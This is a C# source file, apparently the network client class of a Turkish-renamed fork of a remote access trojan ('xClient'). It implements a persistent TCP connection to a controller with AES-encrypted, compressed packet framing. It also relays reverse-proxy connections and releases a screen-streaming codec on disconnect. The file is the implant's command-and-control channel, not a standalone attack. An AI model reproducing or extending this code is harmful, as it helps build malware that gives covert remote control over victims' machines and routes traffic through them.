using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using xClient.KuuhakuÇekirdek.Sıkıştırma;
using xClient.KuuhakuÇekirdek.Kriptografi;
using xClient.KuuhakuÇekirdek.Eklentiler;
using xClient.KuuhakuÇekirdek.NetSerializer;
using xClient.KuuhakuÇekirdek.Paketler;
using xClient.KuuhakuÇekirdek.ReverseProxy;
using xClient.KuuhakuÇekirdek.ReverseProxy.Packets;

namespace xClient.KuuhakuÇekirdek.Ağ
{
    public class Client
    {
        public event ClientFailEventHandler ClientFail;
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            if (handler != null)
            {
                handler(this, ex);
            }
        }

        public event ClientStateEventHandler ClientState;

        public delegate void ClientStateEventHandler(Client s, bool connected);

        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            if (handler != null)
            {
                handler(this, connected);
            }
        }

        public event ClientReadEventHandler ClientRead;

        public delegate void ClientReadEventHandler(Client s, IPacket packet);

        private void OnClientRead(IPacket packet)
        {
            var handler = ClientRead;
            if (handler != null)
            {
                handler(this, packet);
            }
        }

        public event ClientWriteEventHandler ClientWrite;

        public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

        private void OnClientWrite(IPacket packet, long length, byte[] rawData)
        {
            var handler = ClientWrite;
            if (handler != null)
            {
                handler(this, packet, length, rawData);
            }
        }
        public enum ReceiveType
        {
            Header,
            Payload
        }

        public int BUFFER_SIZE { get { return 1024 * 16; } } // 16KB

        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s

        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s

        public int HEADER_SIZE { get { return 4; } } // 4B

        public int MAX_PACKET_SIZE { get { return (1024 * 1024) * 5; } } // 5MB

        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        private Socket _handle;

        private List<ReverseProxyClient> _proxyClients;
        private readonly object _proxyClientsLock = new object();

        private byte[] _readBuffer;
        private byte[] _payloadBuffer;

        private readonly Queue<byte[]> _sendBuffers = new Queue<byte[]>();
        private bool _sendingPackets;
        private readonly object _sendingPacketsLock = new object();
        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

        private bool _readingPackets;

        private readonly object _readingPacketsLock = new object();

        private byte[] _tempHeader;

        private bool _appendHeader;

        // Bilgi al
        private int _readOffset;
        private int _writeOffset;
        private int _tempHeaderOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;
        public bool Connected { get; private set; }

        protected Serializer Serializer { get; set; }

        private const bool encryptionEnabled = true;
        private const bool compressionEnabled = true;

        protected Client()
        {
            _proxyClients = new List<ReverseProxyClient>();
            _readBuffer = new byte[BUFFER_SIZE];
            _tempHeader = new byte[HEADER_SIZE];
        }

        protected void Connect(string host, ushort port)
        {
            try
            {
                Disconnect();

                _handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                _handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                _handle.Connect(host, port);

                if (_handle.Connected)
                {
                    _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
                    OnClientState(true);
                }
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(IAsyncResult result)
        {
            int bytesTransferred;

            try
            {
                bytesTransferred = _handle.EndReceive(result);

                if (bytesTransferred <= 0)
                    throw new Exception("no bytes transferred");
            }
            catch (NullReferenceException)
            {
                return;
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            catch (Exception)
            {
                Disconnect();
                return;
            }

            byte[] received = new byte[bytesTransferred];

            try
            {
                Array.Copy(_readBuffer, received, received.Length);
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
                return;
            }

            lock (_readBuffers)
            {
                _readBuffers.Enqueue(received);
            }

            lock (_readingPacketsLock)
            {
                if (!_readingPackets)
                {
                    _readingPackets = true;
                    ThreadPool.QueueUserWorkItem(AsyncReceive);
                }
            }

            try
            {
                _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(object state)
        {
            while (true)
            {
                byte[] readBuffer;
                lock (_readBuffers)
                {
                    if (_readBuffers.Count == 0)
                    {
                        lock (_readingPacketsLock)
                        {
                            _readingPackets = false;
                        }
                        return;
                    }

                    readBuffer = _readBuffers.Dequeue();
                }

                _readableDataLen += readBuffer.Length;
                bool process = true;
                while (process)
                {
                    switch (_receiveState)
                    {
                        case ReceiveType.Header:
                            {
                                if (_readableDataLen >= HEADER_SIZE)
                                { // başlığı oku
                                    int headerLength = (_appendHeader)
                                        ? HEADER_SIZE - _tempHeaderOffset
                                        : HEADER_SIZE;

                                    try
                                    {
                                        if (_appendHeader)
                                        {
                                            try
                                            {
                                                Array.Copy(readBuffer, _readOffset, _tempHeader, _tempHeaderOffset,
                                                    headerLength);
                                            }
                                            catch (Exception ex)
                                            {
                                                process = false;
                                                OnClientFail(ex);
                                                break;
                                            }
                                            _payloadLen = BitConverter.ToInt32(_tempHeader, 0);
                                            _tempHeaderOffset = 0;
                                            _appendHeader = false;
                                        }
                                        else
                                        {
                                            _payloadLen = BitConverter.ToInt32(readBuffer, _readOffset);
                                        }

                                        if (_payloadLen <= 0 || _payloadLen > MAX_PACKET_SIZE)
                                            throw new Exception("invalid header");
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    _readableDataLen -= headerLength;
                                    _readOffset += headerLength;
                                    _receiveState = ReceiveType.Payload;
                                }
                                else
                                {
                                    try
                                    {
                                        Array.Copy(readBuffer, _readOffset, _tempHeader, _tempHeaderOffset, _readableDataLen);
                                    }
                                    catch (Exception ex)
                                    {
                                        process = false;
                                        OnClientFail(ex);
                                        break;
                                    }
                                    _tempHeaderOffset += _readableDataLen;
                                    _appendHeader = true;
                                    process = false;
                                }
                                break;
                            }
                        case ReceiveType.Payload:
                            {
                                if (_payloadBuffer == null || _payloadBuffer.Length != _payloadLen)
                                    _payloadBuffer = new byte[_payloadLen];

                                int length = (_writeOffset + _readableDataLen >= _payloadLen)
                                    ? _payloadLen - _writeOffset
                                    : _readableDataLen;

                                try
                                {
                                    Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
                                }
                                catch (Exception ex)
                                {
                                    process = false;
                                    OnClientFail(ex);
                                    break;
                                }

                                _writeOffset += length;
                                _readOffset += length;
                                _readableDataLen -= length;

                                if (_writeOffset == _payloadLen)
                                {
                                    bool isError = _payloadBuffer.Length == 0;

                                    if (!isError)
                                    {
                                        if (encryptionEnabled)
                                            _payloadBuffer = AES.Decrypt(_payloadBuffer);

                                        isError = _payloadBuffer.Length == 0;
                                    }

                                    if (!isError)
                                    {
                                        if (compressionEnabled)
                                        {
                                            try
                                            {
                                                _payloadBuffer = SafeQuickLZ.Decompress(_payloadBuffer);
                                            }
                                            catch (Exception)
                                            {
                                                process = false;
                                                Disconnect();
                                                break;
                                            }
                                        }

                                        isError = _payloadBuffer.Length == 0;
                                    }

                                    if (isError)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    using (MemoryStream deserialized = new MemoryStream(_payloadBuffer))
                                    {
                                        try
                                        {
                                            IPacket packet = (IPacket)Serializer.Deserialize(deserialized);

                                            OnClientRead(packet);
                                        }
                                        catch (Exception ex)
                                        {
                                            process = false;
                                            OnClientFail(ex);
                                            break;
                                        }
                                    }

                                    _receiveState = ReceiveType.Header;
                                    _payloadBuffer = null;
                                    _payloadLen = 0;
                                    _writeOffset = 0;
                                }

                                if (_readableDataLen == 0)
                                    process = false;

                                break;
                            }
                    }
                }

                if (_receiveState == ReceiveType.Header)
                {
                    _writeOffset = 0;
                }
                _readOffset = 0;
                _readableDataLen = 0;
            }
        }

        public void Send<T>(T packet) where T : IPacket
        {
            if (!Connected || packet == null) return;

            lock (_sendBuffers)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    try
                    {
                        Serializer.Serialize(ms, packet);
                    }
                    catch (Exception ex)
                    {
                        OnClientFail(ex);
                        return;
                    }

                    byte[] payload = ms.ToArray();

                    _sendBuffers.Enqueue(payload);

                    OnClientWrite(packet, payload.LongLength, payload);

                    lock (_sendingPacketsLock)
                    {
                        if (_sendingPackets) return;

                        _sendingPackets = true;
                    }
                    ThreadPool.QueueUserWorkItem(Send);
                }
            }
        }

        public void SendBlocking<T>(T packet) where T : IPacket
        {
            Send(packet);
            while (_sendingPackets)
            {
                Thread.Sleep(10);
            }
        }

        private void Send(object state)
        {
            while (true)
            {
                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                byte[] payload;
                lock (_sendBuffers)
                {
                    if (_sendBuffers.Count == 0)
                    {
                        SendCleanup();
                        return;
                    }

                    payload = _sendBuffers.Dequeue();
                }

                try
                {
                    _handle.Send(BuildPacket(payload));
                }

                catch (Exception ex)
                {
                    OnClientFail(ex);
                    SendCleanup(true);
                    return;
                }
            }
        }

        private byte[] BuildPacket(byte[] payload)
        {
            if (compressionEnabled)
                payload = SafeQuickLZ.Compress(payload);

            if (encryptionEnabled)
                payload = AES.Encrypt(payload);

            byte[] packet = new byte[payload.Length + HEADER_SIZE];
            Array.Copy(BitConverter.GetBytes(payload.Length), packet, HEADER_SIZE);
            Array.Copy(payload, 0, packet, HEADER_SIZE, payload.Length);
            return packet;
        }

        private void SendCleanup(bool clear = false)
        {
            lock (_sendingPacketsLock)
            {
                _sendingPackets = false;
            }

            if (!clear) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Clear();
            }
        }

        public void Disconnect()
        {
            if (_handle != null)
            {
                _handle.Close();
                _handle = null;
                _readOffset = 0;
                _writeOffset = 0;
                _tempHeaderOffset = 0;
                _readableDataLen = 0;
                _payloadLen = 0;
                _payloadBuffer = null;
                _receiveState = ReceiveType.Header;

                if (_proxyClients != null)
                {
                    lock (_proxyClientsLock)
                    {
                        try
                        {
                            foreach (ReverseProxyClient proxy in _proxyClients)
                                proxy.Disconnect();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }

                if (Eylemler.Eylemİşleyicisi.StreamCodec != null)
                {
                    Eylemler.Eylemİşleyicisi.StreamCodec.Dispose();
                    Eylemler.Eylemİşleyicisi.StreamCodec = null;
                }
            }

            OnClientState(false);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(new ReverseProxyClient(command, this));
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
    }
}